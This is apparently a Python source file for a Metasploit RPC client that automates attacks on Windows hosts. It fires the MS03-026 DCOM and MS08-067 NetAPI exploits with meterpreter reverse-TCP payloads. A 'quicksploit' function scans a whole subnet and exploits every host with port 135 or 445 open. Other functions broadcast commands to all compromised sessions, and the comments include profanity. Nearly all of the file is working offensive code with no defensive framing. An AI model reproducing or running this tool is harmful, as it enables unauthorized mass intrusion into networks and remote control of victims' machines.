import time
import msgpack
import http.client
import sys
from threading import Timer
from PortScannerThread import PortScannerThread
class MSFHandler:

	def __init__(self, metasploitServer, metasploitPort, msgPackUsername, msgPackPassword, msgPackToken):
		self.metasploitServer = metasploitServer
		self.metasploitPort   = metasploitPort
		self.msgPackUsername     = msgPackUsername
		self.msgPackPassword = msgPackPassword
		self.msgPackToken    = msgPackToken
		self.createConnection()
		self.initalizeConnection()
		self.lhost = '127.0.0.1'
		#I know i know i hate this to..but fuck threads
		global timer

	def setLHost(self,args):
		commands = args.split(' ')
		if len(commands) == 1 :
			self.lhost = args
		else:
			print('[!] Too many parameters provided')

	def scheduledTask(self):
		#This just pulls the version number every 4 minutes 
		#We do this so we do not have to pull a new token
		params = msgpack.packb(['core.version',self.msgPackToken])
		self.sendCommand(params)
		self.getResponse()
		self.startPingPongThread()

	def createConnection(self):
		self.headers = {"Content-type" : "binary/message-pack" }
		self.client  = http.client.HTTPConnection(self.metasploitServer,self.metasploitPort)

	def initalizeConnection(self):
		params = msgpack.packb(['auth.login',self.msgPackUsername,self.msgPackPassword])
		self.sendCommand(params)

		response = self.getResponse()
		if response.status == 200:
			data = response.read()
			print("[*] Connected to server successfully")
		else:
			print("[!] Connection to Server Failed")

		res = msgpack.unpackb(data)

		if res[b'result'] == b'success':
			self.msgPackToken = res[b'token']
			print("[*] Authenticated with the server successfully")
		else:
			print("[!] Authentication with server failed")
			print("[!] Exiting please check settings")
			sys.exit()

		#Start the scheduled version call
		self.startPingPongThread()

	def startPingPongThread(self):
		self.timer = Timer(240,self.scheduledTask,())
		self.timer.start()

	def sendCommand(self,params):
		self.client.request("POST","/api/", params, self.headers)

	def getResponse(self):
		return self.client.getresponse()

	def runExploitCommand(self,args):
		# Just making sure we don't have no commands
		commands = args.split(' ')

		if len(commands) == 2:
			if commands[0] == 'dcom':
				self.handleDecomCommand(commands[1:])
			elif commands[0] == 'netapi':
				self.handleNetApiCommand(commands[1:])
			else:
				print("[!] Unrecognized Command please check")
		else:
			print('[!] Invalid amount of arguments')

	def getSessionsList(self):
		params = msgpack.packb(['session.list',self.msgPackToken])
		self.sendCommand(params)
		response = self.getResponse()
		return msgpack.unpackb(response.read())

	def runSessionInfoCommand(self,args):
		commands = args.split(' ')
		if len(commands) == 1:
			self.handleSessionInfoCommand(commands[0])

	def runSessionCommand(self,args):
		self.handleSessionCommand(args)

	def runSessionsCommand(self,args):
		self.handleShowSessionsCommand()

	def runSendToSessionsCommand(self,args):
		self.handleSendToSessionsCommand(args)

	def runQuickSploit(self,args):
		self.handleQuickSploitCommand(args)

	def handleSessionCommand(self,args):
		found = False

		res = self.getSessionsList()
		for x in res:
			if x == int(args[0]):
				#clear the old buffer data
				self.clearOldBufferData(x)

				meterpreterCommands = "".join(args[1:]).strip()
				params = msgpack.packb(['session.meterpreter_write',self.msgPackToken,x,meterpreterCommands])
				self.sendCommand(params)
				response = self.getResponse()

				waitForCommand = True
				#Wait for response
				while waitForCommand:
					params = msgpack.packb(['session.meterpreter_read',self.msgPackToken,x])
					self.sendCommand(params)
					response = self.getResponse()
					res = msgpack.unpackb(response.read())
					if res != "":
						print(res[b'data'].decode("utf-8"))
						waitForCommand = False

	def clearOldBufferData(self,session):
		params = msgpack.packb(['session.meterpreter_read',self.msgPackToken,session])
		self.sendCommand(params)
		response = self.getResponse()

	def handleSessionInfoCommand(self,arg):
		found = False

		res = self.getSessionsList()

		for x in res:
			if x == int(arg):
				found = True
				print("\n--- Session",x,"---")
				print("Type: ",res[x][b'type'].decode("utf-8"))
				print("UUID: ",res[x][b'uuid'].decode("utf-8"))
				print("Username: ",res[x][b'username'].decode("utf-8"))
				print("TargetHost: ",res[x][b'target_host'].decode("utf-8"))
				print("ExploitUsed: ",res[x][b'via_exploit'].decode("utf-8"))
				print("PayloadUsed: ",res[x][b'via_payload'].decode("utf-8"))
				print("")
		if found == False:
			print("[!] No Session with that id exist")

	def handleShowSessionsCommand(self):
		params = msgpack.packb(['session.list',self.msgPackToken])
		self.sendCommand(params)
		response = self.getResponse()
		res = msgpack.unpackb(response.read())
		print("\n---Active Sessions---\n")
		print("  ID | Address")
		print("  ------------")
		for x in res:
			print("* ",x,"-",res[x][b'target_host'].decode("utf-8"))

		print("")

	def handleSendToSessionsCommand(self,args):
		print("[*] Sending [","".join(args).strip(),"] to all active sessions")
		res = self.getSessionsList()
		for x in res:
			meterpreterCommands = "".join(args).strip()
			params = msgpack.packb(['session.meterpreter_write',self.msgPackToken,x,meterpreterCommands])
			self.sendCommand(params)
			response = self.getResponse()
		print("[*] Commands sent to all sessions")

	def handleDecomCommand(self,args):
		#exploit/windows/dcerpc/ms03_026_dcom
		print('[*] Sending Exploit',args[0])
		params=msgpack.packb(['module.execute',self.msgPackToken,"exploit","windows/dcerpc/ms03_026_dcom",
			{"LHOST":self.lhost,"RHOST":args[0],"RPORT":"135","PAYLOAD":"windows/meterpreter/reverse_tcp"}])

		self.sendCommand(params)

		response = self.getResponse()

		if response.status == 200:
			print("[*] Exploit Sent to",args[0])
		else:
			print("[!] Exploit failed to send to",args[0])
		
		print("[*] Check Sessions")

	def handleNetApiCommand(self,args):
		#exploit/windows/smb/ms08_067_netapi		
		print('[*] Sending Exploit')

		params=msgpack.packb(['module.execute',self.msgPackToken,"exploit","windows/smb/ms08_067_netapi",
			{"LHOST":self.lhost,"RHOST":args[0],"RPORT":"445","PAYLOAD":"windows/meterpreter/reverse_tcp"}])

		self.sendCommand(params)
		response = self.getResponse()

		if response.status == 200:
			print("[*] Exploit Sent to",args[0])
		else:
			print("[!] Exploit failed to send to",args[0])
		
		print("[*] Check Sessions")

	def handleQuickSploitCommand(self,args):
		print("[*] Fuck bitches get money")
		args = args.split('.')
		if len(args) == 4:
			threads = []

			for x in range(int(args[3]),254):

				portThread = PortScannerThread('.'.join(args[:3])+"."+str(x))
				portThread.start()
				threads.append(portThread)

			runPortQuery = True

			while runPortQuery:

				stillScanning = False

				for thread in threads:
					if thread.isComplete():

						for port in thread.getOpenPorts():
							if port == 135:
								self.silentDcom(thread.getIpAddress())
							if port == 445:
								self.silentNetApi(thread.getIpAddress())

					else:
						stillScanning = True

				if stillScanning == False:
					runPortQuery = False

			print("[*] Completed quicksploit command check sessions")
		else:
			print("[!] Please provide a valid start ip in the format of *.*.*.1")

	def silentDcom(self,ip):
		params=msgpack.packb(['module.execute',self.msgPackToken,"exploit","windows/dcerpc/ms03_026_dcom",
			{"LHOST":self.lhost,"RHOST":ip,"RPORT":"135","PAYLOAD":"windows/meterpreter/reverse_tcp"}])

		self.sendCommand(params)

		response = self.getResponse()
		if response.status == 200:
			print("[*] Exploit Sent to",ip)
		else:
			print("[!] Exploit failed to send to",ip)

	def silentNetApi(self,ip):
		params=msgpack.packb(['module.execute',self.msgPackToken,"exploit","windows/smb/ms08_067_netapi",
			{"LHOST":self.lhost,"RHOST":ip,"RPORT":"445","PAYLOAD":"windows/meterpreter/reverse_tcp"}])

		self.sendCommand(params)
		response = self.getResponse()
		if response.status == 200:
			print("[*] Exploit Sent to ",ip)
		else:
			print("[!] Exploit failed to send",ip)

	def exit(self):
		self.timer.cancel()